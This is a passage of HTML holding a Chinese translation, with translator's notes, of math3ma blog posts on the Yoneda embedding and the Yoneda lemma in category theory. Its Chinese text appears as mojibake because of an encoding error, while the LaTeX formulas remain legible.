theory?</a>ï¼ŒåŒæ—¶è¯·æ³¨æ„åŒºåˆ† $f^*$ ä¸ $f_*$ è¿™ä¸¤ä¸ªè®°å·ä»¥å…æ··æ·†å‰å¤åˆä¸åå¤åˆï¼‰ã€‚ç±»ä¼¼çš„ï¼Œå¯¹äºCä¸­çš„æ‰€æœ‰Zï¼Œé›†åˆ$\\text{hom}(X,Z)$éƒ½åœ¨<a href=\"https://www.math3ma.com/blog/what-is-a-functor-part-1\">åå˜å‡½å­(covariant functor)</a> $\\text{hom}(X,-):\\mathbf{C}\\rightarrow\\mathbf{Set}$çš„åƒ(image)ä¸­ã€‚</p>\n<p><img src=\"/yoneda/network.jpg\" loading=\"lazy\"></p>\n<hr>\n<blockquote>\n<p>â€œä¸€ä¸ªå¯¹è±¡â€˜å®Œå…¨ç”±â€¦ç¡®å®šâ€™â€æ„å‘³ç€ä½ çŸ¥é“å®ƒæ˜¯åœ¨åŒæ„çš„æ„ä¹‰ä¸‹ç­‰ä»·(up to isomorphism)çš„ã€‚</p>\n</blockquote>\n<p>è¯´â€œä¸€ä¸ªå¯¹è±¡Xå®Œå…¨ç”±â€¦ç¡®å®šâ€æ„å‘³ç€Xä½œä¸ºç”±çœç•¥å·å¤„å†…å®¹æ‰€è¡¨å¾çš„å¯¹è±¡ï¼Œå…¶<a href=\"https://www.math3ma.com/blog/up-to-isomorphism\">åœ¨åŒæ„çš„æ„ä¹‰ä¸‹</a>æ˜¯å”¯ä¸€çš„ã€‚æ¯”å¦‚åœ¨æœ¬éƒ¨åˆ†ç¬¬ä¸€æ®µä¸­ï¼Œçœç•¥å·å¤„å¯¹åº”çš„æ˜¯â€œå®ƒä»¬ä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»â€ã€‚ï¼ˆå°½ç®¡é€šå¸¸æ¥è¯´çœç•¥å·å¤„æ˜¯ä¸€ä¸ª<a href=\"https://jeremykun.com/2013/05/24/universal-properties/\">æ™®é€‚æ€§è´¨</a>ã€‚è¿™å¾ˆæ­£å¸¸ã€‚æ ¹æ®<a href=\"#1\">Yonedaè§†è§’</a>ï¼Œè¿™ä¸¤ç§å¡«åœ¨çœç•¥å·å¤„çš„å†…å®¹æ²¡å•¥åŒºåˆ«ï¼ï¼ˆè¯‘è€…æ³¨ï¼šç¡®å®ä¸çŸ¥é“æ€ä¹ˆç¿»è¯‘è¯¥å¥â€the two addendums go hand in handâ€ï¼Œæ­¤å¤„çš„ä¸¤ç§addendumså¯èƒ½æŒ‡çš„æ˜¯è¿½åŠ åœ¨çœç•¥å·å¤„çš„å¯ä»¥æ˜¯â€œå¯¹è±¡å¸¦æœ‰çš„æ™®é€‚æ€§è´¨&#x2F;å¯¹è±¡çš„å®šä¹‰è•´å«çš„å±æ€§â€ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸Šæ–‡çš„â€œå¯¹è±¡ä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»â€ï¼Œè€Œè¿™ä¸¤ç§ç­”æ¡ˆæœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼‰ï¼‰é‡ç‚¹åœ¨äºï¼Œå¦‚æœYä¸Xä»¥<em>ç›¸åŒ</em>çš„æ–¹å¼ä¸Cä¸­çš„<em>æ‰€æœ‰</em>å…¶ä»–å¯¹è±¡è”ç³»â€”â€”ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä»æ•´ä¸ªèŒƒç•´çš„è§†ç‚¹çœ‹ï¼ŒYçœ‹èµ·æ¥å°±åƒXä¸€æ ·â€”â€”é‚£ä¹ˆXå’ŒYä¸€å®šæ˜¯åŒæ„çš„ã€‚</p>\n<p>ä¾‹å¦‚ï¼Œå‡è®¾Xå’ŒYæ˜¯æ‹“æ‰‘ç©ºé—´ï¼Œä»¤$\\cdot$è¡¨ç¤ºå•ç‚¹ç©ºé—´ï¼Œ$I$å’Œ$S^1$è¡¨ç¤ºå•ä½åŒºé—´å’Œåœ†ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ‰ï¼Œ</p>\n<ul>\n<li>Xå’ŒYå…·æœ‰ç›¸åŒçš„åŠ¿(cardinality)å½“ä¸”ä»…å½“ $\\text{hom}(\\bullet,X) \\cong \\text{hom}(\\bullet,Y)$</li>\n<li>Xå’ŒYå…·æœ‰ç›¸åŒçš„è·¯å¾„ç©ºé—´(path space)å½“ä¸”ä»…å½“ $\\text{hom}(I,X) \\cong \\text{hom}(I,Y)$</li>\n<li>Xå’ŒYå…·æœ‰ç›¸åŒçš„ï¼ˆè‡ªç”±ï¼‰<a href=\"https://en.wikipedia.org/wiki/Loop_space\">ç¯ç©ºé—´(loop space)</a>å½“ä¸”ä»…å½“ $\\text{hom}(S^1,X) \\cong \\text{hom}(S^1,Y)$</li>\n</ul>\n<p><img src=\"/yoneda/probe.jpg\" loading=\"lazy\"></p>\n<p>æ ¹æ®è·¯å¾„ç©ºé—´å’Œç¯ç©ºé—´çš„å®šä¹‰ï¼Œåä¸¤ç‚¹æˆç«‹ã€‚ï¼ˆå®ƒä»¬åˆ†åˆ«æ˜¯ä»$I$å’Œ$S^1$åˆ°$X$çš„æ‰€æœ‰è¿ç»­å‡½æ•°çš„ç©ºé—´ã€‚ï¼‰è€Œè‡³äºç¬¬ä¸€ç‚¹ï¼Œåªæ˜¯å› ä¸ºä¸€ä¸ªå½¢å¦‚$\\bullet \\to X$çš„æ˜ å°„å…¶å®å°±æ˜¯åœ¨$X$ä¸­é€‰æ‹©ä¸€ä¸ªç‚¹ã€‚æˆ‘ä»¬ç”šè‡³å¯ä»¥è¯´$\\bullet \\to X$æ˜¯$X$çš„ä¸€ä¸ªâ€œ$\\bullet$å¡‘é€ çš„å…ƒç´ â€ã€‚ç±»ä¼¼åœ°ï¼Œä¸€ä¸ªè·¯å¾„$I \\to X$å¯ä»¥è¢«çœ‹ä½œæ˜¯$X$çš„ä¸€ä¸ªâ€œ$I$å¡‘é€ çš„å…ƒç´ â€ï¼Œè€Œä¸€ä¸ªç¯$S^1 \\to X$åˆ™æ˜¯ä¸€ä¸ªâ€œ$S^1$å¡‘é€ çš„å…ƒç´ ã€‚â€ æœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬ä½¿ç”¨$\\bullet$ã€$I$å’Œ$S^1$æ¥æ¢æµ‹(probe)$X$å’Œ$Y$. ä¸ºäº†æ´æ‚‰å…¨è²Œï¼Œæˆ‘ä»¬å¿…é¡»ç”¨<em>æ‰€æœ‰</em>ç©ºé—´æ¢æµ‹å®ƒä»¬â€”â€”ä¹Ÿå³ä»<em>æ‰€æœ‰</em>ç©ºé—´çš„è§†ç‚¹è§‚å¯Ÿå®ƒä»¬ã€‚</p>\n<hr>\n<p>åœ¨ç¡®ç«‹è¿™äº›æ•°å­¦å½¢å¼ä¹‹åï¼Œâ€œä¸€ä¸ªå¯¹è±¡Xå®Œå…¨ç”±Xä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»æ‰€ç¡®å®šâ€è¿™ä¸ªè¯´æ³•ç°åœ¨å¯ä»¥æ˜ç¡®ä¸ºä¸¤ä¸ªè¦ç‚¹ï¼š</p>\n<blockquote>\n<p><strong>è¦ç‚¹ #1.</strong> å…³äºXçš„ä¸€åˆ‡æˆ‘ä»¬éœ€è¦çŸ¥é“çš„ä¸œè¥¿éƒ½è¢«ç¼–ç åœ¨$\\text{hom}(-,X)$ä¸­ã€‚å®é™…ä¸Šï¼Œå¯¹è±¡X<strong>è¡¨ç¤º</strong>äº†å‡½å­$\\text{hom}(-,X)$. </p>\n</blockquote>\n<blockquote>\n<p><strong>è¦ç‚¹ #2.</strong> å½“ä¸”ä»…å½“å®ƒä»¬æ‰€è¡¨ç¤ºçš„å‡½å­$\\text{hom}(-,X)$å’Œ$\\text{hom}(-,Y)$åŒæ„æ—¶ï¼ŒXå’ŒYæ‰æ˜¯åŒæ„çš„ã€‚</p>\n</blockquote>\n<p>æˆ‘ä»¬ç°åœ¨å…ˆè€ƒè™‘ç¬¬ä¸€ç‚¹ï¼Œä¹‹åå†é‡æ–°å®¡è§†ç¬¬äºŒç‚¹ã€‚æ‰€ä»¥æˆ‘ä»¬çœŸçš„èƒ½å¤Ÿåƒç¬¬ä¸€ç‚¹è¯´çš„é‚£æ ·ç”¨ä¸€ä¸ªå‡½å­æ¥ç¡®å®šä¸€ä¸ªå¯¹è±¡å—ï¼Ÿæ˜¾ç„¶å­˜åœ¨ä¸€ä¸ªæŒ‡æ´¾<br>$$X \\mapsto \\text{hom}(-, X)$$<br>è¿™æ˜¯å› ä¸ºèŒƒç•´ $\\mathbf{C}$ ä¸­çš„ä»»ä½•å¯¹è±¡ $X$ éƒ½å¯¹åº”äºä¸€ä¸ªå‡½å­ $\\text{hom}(-,X)$ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½å­å­˜åœ¨äºâ€¦ å‘ƒâ€¦ åœ¨å“ªå‘¢ï¼Ÿ$\\text{hom}(-,X)$ ä½äºå“ªé‡Œï¼Ÿå®ƒä¹Ÿå­˜åœ¨äºä¸€ä¸ªèŒƒç•´ä¸­ï¼æ­£å¦‚æˆ‘ä»¬å¾ˆä¹…ä»¥å‰æåˆ°çš„ï¼Œå­˜åœ¨ä¸€ä¸ªèŒƒç•´ $\\mathbf{Set}^{ \\mathbf{C}^{op} }$ ï¼Œå®ƒçš„å¯¹è±¡æ˜¯ä» $\\mathbf{C}^{op}$ åˆ° $\\mathbf{Set}$ çš„å‡½å­ï¼Œè€Œå…¶æ€å°„æ˜¯è‡ªç„¶å˜æ¢ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€ä¸ªå‡½å­ $\\mathscr{Y}: \\mathbf{C} \\rightarrow \\mathbf{Set}^{ \\mathbf{C}^{op} }$ï¼Œå®ƒå°†å¯¹è±¡ $X$ æ˜ å°„åˆ° $\\text{hom}(-, X)$ï¼Œå°†ä¸€ä¸ªæ€å°„ $f: X \\rightarrow Y$ æ˜ å°„åˆ°è‡ªç„¶å˜æ¢ $f_*: \\text{hom}(-, X) \\rightarrow \\text{hom}(-, Y)$ï¼ˆä½ è‡ªå·±åº”è¯¥èƒ½éªŒè¯ï¼‰ã€‚è¿™ä¸ªè‡ªç„¶å˜æ¢çš„æ¯ä¸ªåˆ†é‡éƒ½æ˜¯é€šè¿‡ä¸ $f$ ååˆæˆ(postcomposing)å¾—åˆ°çš„ã€‚åœ¨èŒƒç•´ $\\mathbf{Set}^{ \\mathbf{C}^{op} }$ ä¸­çš„å‡½å­è¢«ç§°ä¸ºé¢„å±‚(presheaf)ï¼Œæˆ‘ä»¬æ„Ÿå…´è¶£çš„é¢„å±‚ï¼Œå³å½¢å¼ä¸º $\\text{hom}(-,X)$ çš„é¢„å±‚ï¼Œè¢«ç§°ä¸º<strong>å¯è¡¨ç¤ºå‡½å­</strong>(representable functors)ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦è¯æ˜è¿™ä¸ªå‘½åæ˜¯å¦åˆç†ï¼š $X$ çœŸæ­£åœ°ã€å¿ å®åœ°ä¸”æœ€å¤§é™åº¦åœ°<em>è¡¨ç¤º</em>å‡½å­ $\\text{hom}(-, X)$ å—ï¼Ÿ</p>\n<p>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œä½†æœ‰ä¸€ä¸ªæ¡ä»¶ï¼šå½“ $\\mathscr{Y}$ å°† $X$ å‘é€åˆ°é¢„å±‚èŒƒç•´æ—¶ï¼Œå®ƒå¿…é¡»<em>ä¿ç•™</em> $X$ ä¸ $\\mathbf{C}$ ä¸­å¯¹è±¡ä¹‹é—´çš„å…³ç³»ã€‚æ¢å¥è¯è¯´ï¼Œå¯¹äº $X$ å’Œ $Y$ ä¹‹é—´çš„æ¯ä¸ªå…³ç³»ï¼Œåº”æ°å¥½å­˜åœ¨<em>ä¸€ä¸ª</em>å…³ç³»ï¼ˆè‡ªç„¶å˜æ¢ï¼‰åœ¨$\\text{hom}(-, X)$ å’Œ $\\text{hom}(-, Y)$ ä¹‹é—´ã€‚æ›´æ­£å¼åœ°è¯´ï¼Œå¯¹äº $\\mathbf{C}$ ä¸­çš„æ¯å¯¹ $X$ å’Œ $Y$ï¼Œç”± $f \\mapsto f_*$ å®šä¹‰çš„å‡½æ•°<br>$$\\text{hom}(X, Y) \\rightarrow \\mathbf{Nat}(\\text{hom}(-, X), \\text{hom}(-, Y))$$<br>åº”è¯¥æ˜¯ä¸€ä¸ªåŒå°„ã€‚ï¼ˆè®°å· $\\mathbf{Nat}(-,-)$ è¡¨ç¤ºä» [ç•™ç©º] åˆ° [ç•™ç©º] çš„è‡ªç„¶å˜æ¢é›†åˆï¼ˆè¯‘è€…æ³¨ï¼šç•™ç©ºå³ä¸ºåœ¨è¯¥å¤„ä½¿ç”¨ $-$ å¤„å¡«å…¥çš„å¯¹è±¡å¡«ç©ºï¼‰ï¼‰ ã€‚å¦‚æœ $\\mathscr{Y}$ æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œåˆ™ç§°å…¶ä¸ºå…¨å¿ å®(fully faithful)*çš„å¹¶ä¸”ç§°å®ƒå°†èŒƒç•´ $\\mathbf{C}$ <strong>åµŒå…¥</strong>åˆ° $Set^{C^{op} }$ ä¸­ã€‚</p>\n<p><img src=\"/yoneda/embed.jpg\" loading=\"lazy\"></p>\n<p>ä½†é—®é¢˜æ¥äº†ï¼š</p>\n<p>è¿™ä¸ªæŠŠ $f$ æ˜ å°„åˆ° $f_*$ çš„å‡½æ•°<br>$$\\text{hom}(X, Y) \\rightarrow \\mathbf{Nat}(\\text{hom}(-, X), \\text{hom}(-, Y))$$<br>çœŸçš„æ˜¯ä¸€ä¸ªåŒå°„å—ï¼Ÿ</p>\n<p>å•å°„æ€§æ˜¯æ˜¾ç„¶çš„ï¼šå¦‚æœ $f, g: X \\rightarrow Y$ æ˜¯ä¸åŒçš„æ€å°„ï¼Œåˆ™å®ƒä»¬çš„æ¨å‡º(pushforward) $f_*$ å’Œ $g_*$ æ˜¾ç„¶æ˜¯ä¸åŒçš„ã€‚ä½†ï¼Œæ»¡å°„æ€§å‘¢ï¼Ÿç»™å®šä»»æ„çš„è‡ªç„¶å˜æ¢ $\\eta: \\text{hom}(-, X) \\rightarrow \\text{hom}(-, Y)$ï¼Œæ˜¯å¦çœŸçš„å­˜åœ¨ä¸€ä¸ªæ€å°„ $f: X \\rightarrow Y$ ä½¿å¾— $\\eta &#x3D; f_*$ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œ<br><strong><em>æ¯ä¸ª</em>å¯è¡¨ç¤ºå‡½å­ä¹‹é—´çš„è‡ªç„¶å˜æ¢ï¼Œæ˜¯å¦éƒ½æ¥è‡ªäºè¡¨ç¤ºäº†å®ƒä»¬çš„å¯¹è±¡ä¹‹é—´çš„æ€å°„ï¼Ÿ</strong></p>\n<p>å¯èƒ½å­˜åœ¨å¤§é‡çš„è‡ªç„¶å˜æ¢ $\\text{hom}(-, X)$ å’Œ $\\text{hom}(-, Y)$ï¼ä¼¼ä¹ä¸èƒ½æŒ‡æœ›å…¶ä¸­çš„æ¯ä¸ªéƒ½æ¥è‡ªäºä¸€ä¸ª $X \\rightarrow Y$ çš„æ€å°„ã€‚</p>\n<p>ç„¶è€Œï¼Œå¥‡æ€ªçš„æ˜¯ï¼ŒçœŸå°±æ˜¯è¿™æ ·çš„ï¼</p>\n<blockquote>\n<p>è¿˜çœŸæ˜¯ï¼</p>\n</blockquote>\n<p>å¯¹äºæ¯ä¸ªè‡ªç„¶å˜æ¢ $\\eta: \\text{hom}(-, X) \\rightarrow \\text{hom}(-, Y)$ï¼Œå­˜åœ¨å”¯ä¸€çš„æ€å°„ $f: X \\rightarrow Y$ï¼Œä½¿å¾— $\\eta &#x3D; f_*$. </p>\n<p>è€Œ<strong>è¿™</strong>æ­£æ˜¯Yonedaå¼•ç†ç›´æ¥å¯¼å‡ºçš„ã€‚</p>\n<p>ç»“æœæ˜¯ï¼Œ$\\mathscr{Y}$ å°† $\\mathbf{C}$ å…¨å¿ å®åœ°åµŒå…¥åˆ° $\\mathbf{Set}^{ \\mathbf{C}^{op} }$ ä¸­ã€‚ï¼ˆè¿™æ˜¯ä¸Šé¢æåˆ°çš„â€œè¦ç‚¹ #1â€çš„å½¢å¼åŒ–è¡¨è¿°ã€‚ï¼‰å› æ­¤ï¼Œ$\\mathscr{Y}$ è¢«ç§°ä¸º<strong>YonedaåµŒå…¥</strong>ã€‚</p>\n<p>ä½†æ˜¯ï¼Œæ€å°„ $X \\rightarrow Y$ ä¸è‡ªç„¶å˜æ¢ $\\text{hom}(-, X) \\rightarrow \\text{hom}(-, Y)$ ä¹‹é—´æ˜¯åŒå°„çš„è¿™ä¸€äº‹å®ä»…ä»…æ˜¯Yonedaå¼•ç†å¯¼å‡ºçš„ä¸€ä¸ª<em>ç»“æœ</em>ã€‚æ­£å¦‚æˆ‘ä»¬<a href=\"#3\">ä¸‹å‘¨</a>å°†çœ‹åˆ°çš„ï¼ŒYonedaå¼•ç†å…¶å®æ˜¯ä¸€ä¸ªæ›´å¼ºçš„ç»“è®ºï¼å®ƒæ˜¯å…³äº<strong>ä»»æ„</strong>å‡½å­ $F: \\mathbf{C}^{op} \\rightarrow \\mathbf{Set}$ çš„è‡ªç„¶å˜æ¢ $\\text{hom}(-, X) \\rightarrow F$ çš„ç»“è®ºã€‚</p>\n<hr>\n<p>* æ›´ä¸€èˆ¬åœ°ï¼Œå¯¹äºä»»æ„å‡½å­ $F: \\mathbf{C} \\rightarrow \\mathbf{D}$ï¼Œå­˜åœ¨ä¸€ä¸ªå‡½æ•° $\\text{hom}_{\\mathbf{C} }(X, Y) \\rightarrow \\text{hom}_{\\mathbf{D} }(F(X), F(Y))$ï¼Œç”± $f \\mapsto F(f)$ ç»™å‡ºã€‚å¦‚æœè¿™ä¸ªæ˜ å°„æ˜¯å•å°„ï¼Œæˆ‘ä»¬è¯´ $F$ å¿ å®(faithful)ï¼›å¦‚æœå®ƒæ˜¯æ»¡å°„ï¼Œæˆ‘ä»¬è¯´ $F$ å…¨å°„(full)ï¼›å¦‚æœå®ƒæ˜¯åŒå°„ï¼Œæˆ‘ä»¬è¯´ $F$ å…¨å¿ å®(fully faithful)ï¼ˆè¯‘è€…æ³¨ï¼šç›¸å½“äºæ­¤æ—¶æˆ‘ä»¬åªå…³å¿ƒæ€å°„åœ¨Fä½œç”¨ä¸‹çš„å˜åŒ–æƒ…å†µï¼‰ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„<a href=\"http://www.math3ma.com/mathema/2017/7/30/naming-functors\">è¡¨æ ¼</a>ï¼Œç”¨äºå‘½åå…¶ä»–ç±»å‹çš„å‡½å­ã€‚</p>\n<p>(è¯‘è€…æ³¨ï¼šæˆ‘å°†è¿™ä¸ªæœ‰è¶£çš„è¡¨æ ¼ç›´æ¥é™„åœ¨æ­¤å¤„â†“)<br><img src=\"/yoneda/naming.jpg\" loading=\"lazy\"></p>\n<h2 id=\"3-3ï¼šç±³ç”°å¼•ç†-The-Yoneda-Lemma\"><a href=\"#3-3ï¼šç±³ç”°å¼•ç†-The-Yoneda-Lemma\" class=\"headerlink\" title=\"3&#x2F;3ï¼šç±³ç”°å¼•ç†(The Yoneda Lemma)\"></a>3&#x2F;3ï¼š<a name=\"3\"></a>ç±³ç”°å¼•ç†(The Yoneda Lemma)</h2><p><em>æœ¬éƒ¨åˆ†ç¿»è¯‘è‡ª <a href=\"https://www.math3ma.com/blog/the-yoneda-lemma\">https://www.math3ma.com/blog/the-yoneda-lemma</a></em></p>\n<p>æ¬¢è¿æ¥åˆ°å…³äºYonedaå¼•ç†çš„ç¬¬ä¸‰éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœ€åä¸€éƒ¨åˆ†ï¼åœ¨è¿‡å»çš„å‡ å‘¨é‡Œï¼Œæˆ‘ä»¬æ…¢æ…¢æ­ç¤ºäº†<a href=\"#1\">Yonedaè§†è§’</a>èƒŒåçš„æ•°å­¦ï¼Œå³ä¸€ä¸ªå¯¹è±¡å®Œå…¨ç”±å…¶ä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»æ‰€å†³å®šè¿™ä¸€èŒƒç•´è®ºé‡Œçš„åŸåˆ™(maxim)ã€‚</p>\n<p><a href=\"#2\">ä¸Šå‘¨</a>ï¼Œæˆ‘ä»¬å°†è¿™ä¸€åŸåˆ™åˆ†æˆäº†ä¸¤ç‚¹ï¼š</p>\n<blockquote>\n<p><strong>è¦ç‚¹ #1.</strong> å…³äºXçš„ä¸€åˆ‡æˆ‘ä»¬éœ€è¦çŸ¥é“çš„ä¸œè¥¿éƒ½è¢«ç¼–ç åœ¨$\\text{hom}(-,X)$ä¸­ã€‚å®é™…ä¸Šï¼Œå¯¹è±¡X<strong>è¡¨ç¤º</strong>äº†å‡½å­$\\text{hom}(-,X)$. </p>\n</blockquote>\n<blockquote>\n<p><strong>è¦ç‚¹ #2.</strong> å½“ä¸”ä»…å½“å®ƒä»¬æ‰€è¡¨ç¤ºçš„å‡½å­$\\text{hom}(-,X)$å’Œ$\\text{hom}(-,Y)$åŒæ„æ—¶ï¼ŒXå’ŒYæ‰æ˜¯åŒæ„çš„ã€‚</p>\n</blockquote>\n<p>æ³¨æ„åˆ°ç¬¬ä¸€ç‚¹å…¶å®æ˜¯åœ¨ä»¥ä¸é‚£ä¹ˆä¸¥è°¨çš„æ–¹å¼è¡¨è¾¾YonedaåµŒå…¥ $\\mathscr{Y}: \\mathbf{C} \\rightarrow \\mathbf{Set}^{op}$ ï¼ˆå®ƒå°†ä¸€ä¸ªå¯¹è±¡ $X$ æ˜ å°„åˆ°å‡½å­ $\\text{hom}(-,X)$ï¼‰æ˜¯å…¨å¿ å®çš„ã€‚æ¢å¥è¯è¯´ï¼Œä» $\\text{hom}(X,Y)$ï¼ˆä¸€ç»„æ€å°„çš„é›†åˆï¼‰åˆ° $\\mathbf{Nat}(\\text{hom}(-,X), \\text{hom}(-,Y))$ï¼ˆä¸€ç»„è‡ªç„¶å˜æ¢çš„é›†åˆï¼‰çš„å‡½æ•°å°† $f$ æ˜ å°„åˆ° $f_*$ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªåŒå°„ã€‚ï¼ˆæ­¤å¤„ $f_*$ å°†ä»»ä¸€ä¸ªæ€å°„ $g:Z\\rightarrow X$ æ˜ å°„åˆ°è¿™æ ·çš„å¤åˆï¼š $f\\circ g:Z\\rightarrow Y$ï¼ˆè¯‘è€…æ³¨ï¼šä¹Ÿå°±æ˜¯ä¸fåå¤åˆï¼‰ï¼‰ã€‚</p>\n<p>è¿™æ„å‘³ç€å¯¹äºæ¯ä¸ª $f:X\\rightarrow Y$ï¼Œå­˜åœ¨<em>æ°å¥½ä¸€ä¸ª</em>ç”± $f$ è‡ªèº«æ„é€ å‡º(cooked up)çš„è‡ªç„¶å˜æ¢ $\\text{hom}(-,X)\\rightarrow \\text{hom}(-,Y)$. åè¿‡æ¥ï¼Œå¦‚æœ $\\eta:\\text{hom}(-,X)\\rightarrow \\text{hom}(-,Y)$ æ˜¯ä»»ä¸€è‡ªç„¶å˜æ¢ï¼Œåˆ™å­˜åœ¨<em>æ°å¥½ä¸€ä¸ª</em>ç”± $\\eta$ è‡ªèº«å¾—åˆ°çš„æ€å°„ $X\\rightarrow Y$. </p>\n<p><img src=\"/yoneda/bijection.jpg\" loading=\"lazy\"></p>\n<p>ç°åœ¨ï¼Œæœ‰ä¸€ä¸ªç®€å•ä½†è‡³å…³é‡è¦çš„è§‚å¯Ÿå‘ç°ï¼šæ³¨æ„åˆ°é›†åˆ $\\text{hom}(X,Y)$ ä½äºå‡½å­ $\\text{hom}(-,Y):\\mathbf{C}^{op} \\rightarrow \\mathbf{Set}$ çš„åƒä¸­ï¼â€ä½†æ˜¯ï¼Œâ€ ä½ ä¼šé—®ï¼Œ â€œè¿™é‡è¦åœ¨å“ªå‘¢ï¼Ÿâ€</p>\n<p>å› ä¸ºï¼Œè¿™è®©æˆ‘ä»¬å¯ä»¥è¿™æ ·é‡æ–°è¡¨è¿°ä¸Šå‘¨å¾—åˆ°çš„ç»“æœï¼š</p>\n<blockquote>\n<p>å¯¹äºèŒƒç•´ $\\mathbf{C}$ ä¸­çš„ä»»æ„å¯¹è±¡ $X$ï¼Œè‡ªç„¶å˜æ¢ $\\text{hom}(-,X) \\rightarrow \\text{hom}(-,Y)$ ä¸é›†åˆ $\\text{hom}(X,Y)$ ä¸­çš„å…ƒç´ åŒå°„ï¼ˆä¸€ä¸€å¯¹åº”ï¼‰ã€‚</p>\n</blockquote>\n<p>ç›¸å½“ç®€æ´ï¼Œå¯¹å§ï¼Ÿä½ çŸ¥é“çœŸæ­£è®©äººæƒŠå¹çš„æ˜¯ä»€ä¹ˆå—ï¼Ÿè¿™ä¸ªç»“è®ºä¸ä»…å¯¹äºå½¢å¦‚ $\\text{hom}(-,Y)$ çš„å‡½å­æˆç«‹ï¼›å®ƒå¯¹äºä» $\\mathbf{C}^{op}$ åˆ° $\\mathbf{Set}$ çš„<strong>æ‰€æœ‰</strong>å‡½å­éƒ½æˆç«‹ã€‚</p>\n<p><strong>æ‰€æœ‰ï¼</strong></p>\n<p><em>è¿™</em>å°±æ˜¯æ‰€è°“Yonedaå¼•ç†ã€‚</p>\n<h3 id=\"Yonedaå¼•ç†\"><a href=\"#Yonedaå¼•ç†\" class=\"headerlink\" title=\"Yonedaå¼•ç†\"></a>Yonedaå¼•ç†</h3><blockquote>\n<p>å¯¹äºä»»æ„å‡½å­ $F: \\mathbf{C}^{op} \\rightarrow \\mathbf{Set}$ å’ŒèŒƒç•´ $\\mathbf{C}$ ä¸­çš„ä»»æ„å¯¹è±¡ $X$ï¼Œè‡ªç„¶å˜æ¢ $\\text{hom}(-,X) \\rightarrow F$ ä¸é›†åˆ $F(X)$ ä¸­çš„å…ƒç´ ä¸€ä¸€å¯¹åº”ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<br>$$ \\mathbf{Nat}(\\text{hom}(-,X), F) \\cong F(X) $$</p>\n</blockquote>\n<p>ä½ æ˜ç™½è¿™ç©æ„çš„é‡è¦æ€§äº†å—ï¼Ÿè‡ªç„¶å˜æ¢ $\\text{hom}(-,X) \\rightarrow F$ çš„é›†åˆä¼¼ä¹å¯èƒ½æ˜¯è¶…~çº§~å¤§~çš„ï¼Œä¸€å¤§ç‰‡æµ“å¯†çš„æœªçŸ¥ã€éš¾ä»¥é©¯æœå’Œæ²¡ç”¨çš„æ‚è‰ä¸›ã€‚â€ä½†æ˜¯ï¼Œâ€ Yonedaå¼•ç†å‘Šè¯‰æˆ‘ä»¬ï¼Œâ€<em>ä¸æ˜¯è¿™æ ·çš„ï¼</em>â€œ æŠŠFé™åˆ¶åœ¨ç‰¹å®šå¯¹è±¡ $X$ ä¸Šåº”ç”¨ä¼šå¾—åˆ°ä¸€ä¸ªé›†åˆF(X)ï¼Œè€Œ<em>åªæœ‰</em>ä»è¯¥é›†åˆä¸­å…ƒç´ â€œçƒ¹é¥ªâ€è€Œæˆï¼ˆæ„é€ è€Œæ¥ï¼‰çš„è‡ªç„¶å˜æ¢ï¼Œæ‰æ˜¯çœŸå®å­˜åœ¨çš„è‡ªç„¶å˜æ¢ã€‚</p>\n<p>é‚£ä¹ˆè¿™ä¸ªâ€œçƒ¹é¥ªâ€ç”¨åˆ°çš„é£Ÿè°±æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>\n<p>ç»™å®š $c \\in F(X)$ï¼Œå®šä¹‰ $\\eta: \\text{hom}(-,X) \\rightarrow F$ï¼Œé€šè¿‡å£°æ˜ $\\eta _Y: \\text{hom}(Y,X) \\rightarrow F(Y)$ ä¸ºä¸€ä¸ªå°†æ˜ å°„ $g: Y \\rightarrow X$ å‘é€åˆ°åœ¨ $F(Y)$ ä¸­çš„å…ƒç´  $Fg(c)$çš„æ€å°„ï¼Œå…¶ä¸­ $Fg$ è¡¨ç¤ºåœ¨ $F$ ä½œç”¨ä¸‹æ˜ å°„ $g$ å¯¹åº”çš„åƒã€‚</p>\n<p><img src=\"/yoneda/F_bijection.jpg\" loading=\"lazy\"></p>\n<p>åè¿‡æ¥è¯´ï¼Œä»»æ„è‡ªç„¶å˜æ¢ $\\eta: \\text{hom}(-,X) \\rightarrow F$ åªå–å†³äº $F(X)$ ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œå³ $\\eta_X(\\text{id}_X)$. è¿™é‡Œ $\\eta_X$ è¡¨ç¤ºæ€å°„ $\\text{hom}(X,X) \\rightarrow F(X)$ï¼Œè€Œ $\\text{id}_X$ æ˜¯ $X$ ä¸Šçš„å•ä½æ€å°„ï¼ˆè¯‘è€…æ³¨ï¼šå•ä½æ€å°„å³ä¸ºæ’ç­‰æ€å°„ $\\text{id}_X \\in \\text{hom}(X,X)$ ï¼Œè¿™é‡Œå³æ˜¯åºè¨€éƒ¨åˆ†æ‰€è¯´â€œå•ä½æ€å°„â€èµ·åˆ°â€œå‡ç»“æ 